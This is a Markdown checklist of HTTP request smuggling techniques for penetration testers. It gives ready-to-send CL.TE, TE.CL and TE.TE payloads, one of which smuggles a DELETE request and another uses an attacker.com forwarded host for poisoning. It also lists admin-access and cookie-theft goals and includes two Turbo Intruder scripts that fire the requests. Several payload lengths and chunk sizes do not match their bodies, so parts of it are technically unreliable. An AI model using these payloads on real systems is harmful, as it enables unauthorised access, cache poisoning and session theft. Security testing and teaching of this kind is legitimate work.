# HTTP Request Smuggling Vulnerability Checklist

## Overview
HTTP Request Smuggling is a technique that exploits inconsistencies in how different servers interpret HTTP requests, allowing attackers to bypass security controls, access unauthorized resources, and potentially execute attacks. This comprehensive checklist covers modern HTTP request smuggling techniques and exploitation methods.

## Table of Contents
1. [Understanding HTTP Request Smuggling](#understanding-http-request-smuggling)
2. [CL.TE Vulnerabilities](#clte-vulnerabilities)
3. [TE.CL Vulnerabilities](#tecl-vulnerabilities)
4. [TE.TE Vulnerabilities](#tete-vulnerabilities)
5. [Advanced Smuggling Techniques](#advanced-smuggling-techniques)
6. [Exploitation Scenarios](#exploitation-scenarios)
7. [Detection Methods](#detection-methods)
8. [Automation & Tools](#automation--tools)

---

## Understanding HTTP Request Smuggling

### 1. Core Concepts
- **Frontend Server**: First server that receives the request (usually load balancer/proxy)
- **Backend Server**: Server that processes the actual request
- **Request Parsing**: Different servers may parse HTTP requests differently
- **Request Smuggling**: Exploiting parsing differences to smuggle malicious requests

### 2. Common Attack Vectors
- **Bypass Security Controls**: Circumvent WAF, authentication, rate limiting
- **Cache Poisoning**: Poison web caches with malicious content
- **Session Hijacking**: Steal session tokens and cookies
- **Unauthorized Access**: Access restricted resources
- **Information Disclosure**: Extract sensitive information

---

## CL.TE Vulnerabilities

### 1. Content-Length vs Transfer-Encoding
**Frontend**: Uses Content-Length (CL)
**Backend**: Uses Transfer-Encoding (TE)

#### Basic CL.TE Attack
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

#### Advanced CL.TE Attack
```http
POST /login HTTP/1.1
Host: target.com
Content-Length: 189
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3e
return_to=https%3A%2F%2Ftarget.com%2Fadmin
0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Length: 10

x=
```

### 2. CL.TE Bypass Techniques
- **Chunked Encoding**: Use chunked encoding to bypass CL
- **Malformed Chunks**: Send malformed chunk sizes
- **Zero-Length Chunks**: Use zero-length chunks
- **Invalid Chunk Data**: Send invalid chunk data

---

## TE.CL Vulnerabilities

### 1. Transfer-Encoding vs Content-Length
**Frontend**: Uses Transfer-Encoding (TE)
**Backend**: Uses Content-Length (CL)

#### Basic TE.CL Attack
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

3
abc
0

SMUGGLED
```

#### Advanced TE.CL Attack
```http
POST /api/users HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

3
abc
0

DELETE /api/users/123 HTTP/1.1
Host: target.com
Content-Length: 0

```

### 2. TE.CL Bypass Techniques
- **Invalid Chunk Size**: Use invalid chunk sizes
- **Negative Chunk Size**: Use negative chunk sizes
- **Oversized Chunks**: Use oversized chunk sizes
- **Malformed Chunk Headers**: Send malformed chunk headers

---

## TE.TE Vulnerabilities

### 1. Transfer-Encoding vs Transfer-Encoding
**Frontend**: Uses Transfer-Encoding (TE)
**Backend**: Uses Transfer-Encoding (TE) but with different parsing

#### Basic TE.TE Attack
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED
```

#### Advanced TE.TE Attack
```http
POST /admin HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: gzip

0

GET /admin/users HTTP/1.1
Host: target.com
Content-Length: 0

```

### 2. TE.TE Bypass Techniques
- **Duplicate Headers**: Use duplicate Transfer-Encoding headers
- **Invalid Encodings**: Use invalid encoding values
- **Case Sensitivity**: Exploit case sensitivity differences
- **Whitespace**: Use whitespace in headers

---

## Advanced Smuggling Techniques

### 1. Header Injection
- **CRLF Injection**: Inject CRLF sequences in headers
- **Header Smuggling**: Smuggle headers in request body
- **Custom Headers**: Use custom headers for smuggling

### 2. Protocol Downgrade
- **HTTP/1.1 to HTTP/1.0**: Downgrade protocol version
- **HTTP/2 to HTTP/1.1**: Downgrade from HTTP/2
- **Protocol Confusion**: Exploit protocol parsing differences

### 3. Request Splitting
- **Request Splitting**: Split requests across multiple packets
- **Request Merging**: Merge multiple requests into one
- **Request Interleaving**: Interleave requests

---

## Exploitation Scenarios

### 1. Bypass Security Controls
- **WAF Bypass**: Bypass Web Application Firewalls
- **Authentication Bypass**: Bypass authentication mechanisms
- **Rate Limiting Bypass**: Bypass rate limiting controls
- **IP Restrictions**: Bypass IP-based restrictions

### 2. Cache Poisoning
- **Web Cache Poisoning**: Poison web caches
- **CDN Poisoning**: Poison CDN caches
- **Proxy Cache Poisoning**: Poison proxy caches
- **Browser Cache Poisoning**: Poison browser caches

### 3. Session Hijacking
- **Session Token Theft**: Steal session tokens
- **Cookie Theft**: Steal authentication cookies
- **Session Fixation**: Fix session tokens
- **Session Confusion**: Confuse session handling

### 4. Unauthorized Access
- **Admin Panel Access**: Access admin panels
- **API Endpoint Access**: Access restricted API endpoints
- **File System Access**: Access file system resources
- **Database Access**: Access database resources

---

## Detection Methods

### 1. Manual Detection
- **Response Timing**: Monitor response timing differences
- **Error Messages**: Look for error message differences
- **Response Codes**: Monitor HTTP response codes
- **Content Differences**: Compare response content

### 2. Automated Detection
- **Burp Suite**: Use Burp Suite's HTTP Request Smuggling scanner
- **Custom Scripts**: Develop custom detection scripts
- **Fuzzing**: Use fuzzing techniques
- **Reconnaissance**: Use reconnaissance tools

### 3. Detection Payloads
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

---

## Automation & Tools

### 1. Manual Testing Tools
- **Burp Suite**: Use Burp Suite for manual testing
- **OWASP ZAP**: Use OWASP ZAP for vulnerability scanning
- **Custom Scripts**: Develop custom testing scripts

### 2. Automated Testing
- **HTTP Request Smuggling Scanner**: Use automated scanners
- **Fuzzing**: Use fuzzing techniques
- **Reconnaissance**: Use reconnaissance tools

### 3. Payloads and Templates
- **Smuggling Templates**: Use request smuggling templates
- **Payload Generators**: Use payload generators
- **Wordlists**: Use wordlists for testing

---

## Testing Methodology

### Phase 1: Reconnaissance
1. Identify target infrastructure
2. Map frontend and backend servers
3. Identify parsing differences
4. Map security controls

### Phase 2: Vulnerability Assessment
1. Test CL.TE vulnerabilities
2. Test TE.CL vulnerabilities
3. Test TE.TE vulnerabilities
4. Test advanced techniques

### Phase 3: Exploitation
1. Attempt request smuggling
2. Document findings
3. Test impact and scope
4. Report vulnerabilities

---

## Common Payloads

### CL.TE Payloads
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Payloads
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

3
abc
0

SMUGGLED
```

### TE.TE Payloads
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED
```

---

## Turbo Intruder Scripts

### Basic Smuggling Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=5,
                           pipeline=False,
                           maxRetriesPerRequest=0)
    
    attack = '''POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED'''
    
    engine.queue(attack)
    engine.start()
```

### Advanced Smuggling Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=5,
                           pipeline=False,
                           maxRetriesPerRequest=0)
    
    attack = '''POST /login HTTP/1.1
Host: target.com
Content-Length: 189
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3e
return_to=https%3A%2F%2Ftarget.com%2Fadmin
0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Length: 10

x='''
    
    engine.queue(attack)
    engine.start()
```

---

## References
- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HackerOne Request Smuggling Reports](https://hackerone.com/reports?search=request%20smuggling)
- [OWASP Request Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
- [HTTP Request Smuggling Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Request%20Smuggling)
